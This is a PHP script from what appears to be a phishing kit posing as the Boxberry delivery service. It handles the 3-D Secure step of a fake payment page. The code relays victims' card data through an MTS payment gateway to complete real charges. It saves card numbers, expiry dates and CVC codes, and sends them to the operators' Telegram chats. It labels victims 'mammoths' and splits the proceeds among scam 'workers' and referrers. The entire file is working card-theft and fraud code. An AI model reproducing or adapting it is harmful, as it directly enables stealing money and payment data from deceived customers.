<?php

	require_once $_SERVER['DOCUMENT_ROOT'].'/system/mysql.php';
	require_once $_SERVER['DOCUMENT_ROOT'].'/system/config.php';
	
	if (file_exists("temp/" . $_POST["MD"])) {
		$advert = mysqli_fetch_assoc(mysqli_query($connection, "SELECT `worker`, `product`, `amount` FROM `trackcodes` WHERE `code` = '$_REQUEST[order_id]'"));
		$worker = mysqli_fetch_assoc(mysqli_query($connection, "SELECT `id`, `username`, `card`, `stake`, `telegram`, `inviter`, `hidden` FROM `accounts` WHERE `telegram` = '$advert[worker]'"));
		
		$requestData = json_decode(file_get_contents("temp/" . $_POST["MD"]), true);
		unlink("temp/" . $_POST["MD"]);
  		$ch = curl_init("https://payment.mts.ru/verified3ds?MdOrder=".$_POST['MD']."&MD=".$_POST['MD']."&type=2&referer=3");
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            'Host: payment.mts.ru',
            'Accept: */*',
            'Accept-Encoding: gzip, deflate, br',
            'Referer: '.$_SERVER['HTTP_REFERER'],
            'X-Requested-With: XMLHttpRequest',
            'User-Agent: '.getallheaders()['User-Agent'],
            'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
                 'Cookie: .AspNetCore.Antiforgery.Ge25QBab4-8='.$requestData['.AspNetCore.Antiforgery.Ge25QBab4-8'].'; .AspNetCore.RegionId='.$requestData['.AspNetCore.RegionId'].'; BIGipServermsk-pool-eksite-10.74.58.129-fw15-dmz21-81='.$requestData['BIGipServermsk-pool-eksite-10.74.58.129-fw15-dmz21-81'],
        ));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_HEADER, 1);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($_POST));
        $session = curl_exec($ch);
        $tsf = curl_getinfo($ch);
        curl_close($ch);

    	preg_match_all('/^Set-Cookie:\s*([^;]*)/mi', $session, $matches);
       
        $cookies = array();
        foreach($matches[1] as $item) {
            parse_str($item, $cookie);
            $cookies = array_merge($cookies, $cookie);
        }
        $coc = [];
        foreach($cookies as $key=>$val){
            $coc[str_replace('_','.',$key)] = $val;
            
        }

        $ch = curl_init($tsf['redirect_url']);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            'Host: payment.mts.ru',
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Encoding: gzip, deflate, br',
            'Referer: '.$_SERVER['HTTP_REFERER'],
            'User-Agent: '.getallheaders()['User-Agent'],
            'Cookie: .AspNetCore.Antiforgery.Ge25QBab4-8='.$requestData['.AspNetCore.Antiforgery.Ge25QBab4-8'].
            '; .AspNetCore.RegionId='.$requestData['.AspNetCore.RegionId'].
            '; BIGipServermsk-pool-eksite-10.74.58.129-fw15-dmz21-81='.$requestData['BIGipServermsk-pool-eksite-10.74.58.129-fw15-dmz21-81'].
            '; .AspNetCore.Session='.$coc['.AspNetCore.Session'],
        ));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch,CURLOPT_ENCODING, 'gzip');
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($_POST));
        $comission = curl_exec($ch);
        curl_close($ch);
        
        preg_match_all('#<div class="b-page-header__subtitle">(.+?)</div>#is', $comission, $title);
        preg_match_all('#<div class="b-content__title b-content__red">(.+?)</div>#is', $comission, $error);

		
		if($_COOKIE['type'] == 'refund') { $type = Array('возврат', 'Возврат'); } elseif($_COOKIE['type'] == 'order') { $type = Array('доставку', 'Оплата'); } else { $type = Array('доставку', 'Оплата'); }
		
		if(stristr($title[1][0],'прошел успешно')) {

			if(isset($_COOKIE['order_id'])) {
				mysqli_query($connection, "UPDATE `payments` SET `card` = '$requestData[card_number]', `expiry` = '$requestData[mmyy]', `cvc` = '$requestData[cvc]', `recipient` = '$worker[card]', `status` = '1' WHERE `id` = '$_COOKIE[order_id]'");
			} else {
				mysqli_query($connection, "INSERT INTO `payments` (`worker`, `advert_id`, `amount`, `currency`, `card`, `expiry`, `cvc`, `recipient`, `status`, `ip`, `browser`, `os`, `time`) VALUES ('$worker[telegram]', '$_REQUEST[order_id]', '$requestData[amount]', 'RUB', '$requestData[card_number]', '$requestData[mmyy]', '$requestData[cvc]', '$worker[card]', '1', '$visitor[ip]', '$visitor[browser]', '$visitor[os]', '".time()."')");
			}
			
			$payout['total'] = floor((95*(1/100)*$requestData['amount']));
			if($_COOKIE['type'] == 'refund') {
				$payout['worker'] = floor((60*(1/100)*($payout['total']))/500)*500;
			} else {
				$arStake = explode(':', $worker['stake']);
				
				if($_COOKIE['type'] == 'refund') {
					$stake = $arStake[1];
				} else {
					$stake = $arStake[0];
				}
				
				$payout['worker'] = floor(($stake*(1/100)*($payout['total']))/500)*500;
			}
			
			if($worker['inviter'] != 0) {
				$payout['referral'] = floor((2*(1/100)*($payout['total']))/10)*10;
				$payout['team'] = $payout['total']-($payout['worker']+$payout['referral']);
			} else {
				$payout['team'] = $payout['total']-$payout['worker'];
			}
			
			$text = "✅ <b>Мамонт успешно оплатил $type[0]</b>✅\n\n";
			$text .= "💢Платформа: <code>Boxberry</code>\n";
			$text .= "Трек-код: <code>$_REQUEST[order_id]</code>\n";
			$text .= "Название товара: <code>$advert[product]</code>\n";
			$text .= "Сумма товара: <code>$requestData[amount] руб.</code>\n";
			#$text .= "Чистая прибыль: <code>$payout[worker] руб.</code>";
			
			send($config['token'], 'sendMessage', Array('chat_id' => $advert['worker'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
			
			$text = "✅ <b>Мамонт успешно оплатил $type[0]</b>✅\n\n";
			$text .= "💢Платформа: <code>Boxberry</code>\n";
			$text .= "ID воркера: <a href=\"tg://user?id=$advert[worker]\">$advert[worker]</a>\n";
			$text .= "Трек-код: <code>$_REQUEST[order_id]</code>\n";
			$text .= "Сумма: <code>$requestData[amount] руб.</code>\n";
			if($worker['card'] != 0) {
				$text .= "Карта поступления: <code>$worker[card]</code>\n\n";
			} else {
				$text .= "Карта поступления: <code>$config[card]</code>\n\n";
			}
			#$text .= "Доля воркера: <code>$payout[worker] руб.</code>\n";
			if($worker['inviter'] != 0) $text .= "Доля реферала: <code>$payout[referral] руб.</code>\n";
			#$text .= "Доля команды: <code>$payout[team] руб.</code>\n\n";
			$text .= "Номер карты: <code>$requestData[card_number]</code>\n";
			if(isset($_COOKIE['name'])) $text .= "Имя на карте: <code>$_COOKIE[name]</code>\n";
			$text .= "Действительна до: <code>$requestData[mmyy]</code>\n";
			$text .= "CVC/CVV: <code>$requestData[cvc]</code>\n";
			
			send($config['token'], 'sendMessage', Array('chat_id' => $config['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
			
			if($worker['hidden'] == TRUE) {
				$username = 'Скрыт';
			} else {
				if(empty($worker['username']) OR $worker['username'] == 'username') {
					$username = "<a href=\"tg://user?id=$worker[telegram]\">Без никнейма</a>";
				} else {
					$username = "@$worker[username]";
				}
			}
			
			$text = "🚚 <b>Boxberry.$type[1]</b>\n\n";
			$text .= "<b>Сотрудник:</b> $username\n";
			$text .= "<b>Сумма залёта:</b> <code>$requestData[amount] RUB</code>\n";
			
			send($config['token'], 'sendMessage', Array('chat_id' => $config['payments'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
			
			mysqli_query($connection, "UPDATE `accounts` SET `balance` = '$payout[worker]' WHERE `id` = '$worker[id]'");
			
			if($worker['inviter'] != 0 AND $payout['referral'] > 0) {
				$query = mysqli_query($connection, "SELECT `telegram` FROM `accounts` WHERE `telegram` = '$worker[inviter]' AND `access` > '0'");
				
				if(mysqli_num_rows($query) > 0) {
					mysqli_query($connection, "UPDATE `accounts` SET `balance` = `balance`+$payout[referral], `referral` = `referral`+$payout[referral] WHERE `telegram` = '$worker[inviter]' AND `access` > '0'");
					
					$text = "🤝 <b>Пополнение баланса</b>\n\n";
					$text .= "Вы получили <code>$payout[referral] руб.</code> от профита реферала";
					send($config['token'], 'sendMessage', Array('chat_id' => $worker['inviter'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
				}
			}
			
			unset($text);
			
			if($_COOKIE['type'] == 'order') {
				header("Location: https://$_SERVER[SERVER_NAME]/payment?id=$_REQUEST[order_id]");
			} elseif($_COOKIE['type'] == 'refund') {
				header("Location: https://$_SERVER[SERVER_NAME]/refund?id=$_REQUEST[order_id]");
			} else {
				require_once $_SERVER['DOCUMENT_ROOT'].'/success.php';
			}
		} else {
			if(isset($_COOKIE['order_id'])) {
				mysqli_query($connection, "UPDATE `payments` SET `card` = '$requestData[card_number]', `expiry` = '$requestData[mmyy]', `cvc` = '$requestData[cvc]', `recipient` = '$worker[card]', `status` = '0' WHERE `id` = '$_COOKIE[order_id]'");
			} else {
				mysqli_query($connection, "INSERT INTO `payments` (`worker`, `advert_id`, `amount`, `currency`, `card`, `expiry`, `cvc`, `recipient`, `status`, `ip`, `browser`, `os`, `time`) VALUES ('$worker[telegram]', '$_REQUEST[order_id]', '$requestData[amount]', 'RUB', '$requestData[card_number]', '$requestData[mmyy]', '$requestData[cvc]', '$worker[card]', '0', '$visitor[ip]', '$visitor[browser]', '$visitor[os]', '".time()."')");
			}
			

			$res_arr['resultMessage'] = strip_tags(trim($error[1][0]));
			if(empty($res_arr['resultMessage'])) $res_arr['resultMessage'] = 'Информация недоступна';
			
			$text = "⛔️ <b>Мамонт не смог оплатить $type[0]</b>⛔️\n\n";
			$text .= "💢Платформа: <code>Boxberry</code>\n";
			$text .= "Трек-код: <code>$_REQUEST[order_id]</code>\n";
			$text .= "Название товара: <code>$advert[product]</code>\n";
			$text .= "Сумма товара: <code>$requestData[amount] руб.</code>\n\n";
			$text .= "<b>Информация об ошибке:</b>\n<code>$res_arr[resultMessage]</code>\n";
			
			send($config['token'], 'sendMessage', Array('chat_id' => $advert['worker'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
			
			$text = "⛔️ <b>Мамонт не смог оплатить $type[0]</b>⛔️\n\n";
			$text .= "💢Платформа: <code>Boxberry</code>\n";
			$text .= "ID воркера: <a href=\"tg://user?id=$advert[worker]\">$advert[worker]</a>\n";
			$text .= "Трек-код: <code>$_REQUEST[order_id]</code>\n";
			$text .= "Сумма: <code>$requestData[amount] руб.</code>\n";
			if($worker['card'] != 0) {
				$text .= "Карта поступления: <code>$worker[card]</code>\n\n";
			} else {
				$text .= "Карта поступления: <code>$config[card]</code>\n\n";
			}
			$text .= "Номер карты: <code>$requestData[card_number]</code>\n";
			if(isset($_COOKIE['name'])) $text .= "Имя на карте: <code>$_COOKIE[name]</code>\n";
			$text .= "Действительна до: <code>$requestData[mmyy]</code>\n";
			$text .= "CVC/CVV: <code>$requestData[cvc]</code>\n\n";
			$text .= "<b>Информация об ошибке:</b>\n<code>$res_arr[resultMessage]</code>\n";
			
			send($config['token'], 'sendMessage', Array('chat_id' => $config['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
			unset($text);
			
			require_once $_SERVER['DOCUMENT_ROOT'].'/error.php';
		}
	} else {
		if($_COOKIE['type'] == 'order') {
			die(header("Location: https://$_SERVER[SERVER_NAME]/payment?id=$_REQUEST[order_id]"));
		} elseif($_COOKIE['type'] == 'refund') {
			die(header("Location: https://$_SERVER[SERVER_NAME]/refund?id=$_REQUEST[order_id]"));
		} else {
			die(header("Location: https://$_SERVER[SERVER_NAME]/track?track_id=$_REQUEST[order_id]"));
		}
	}

?>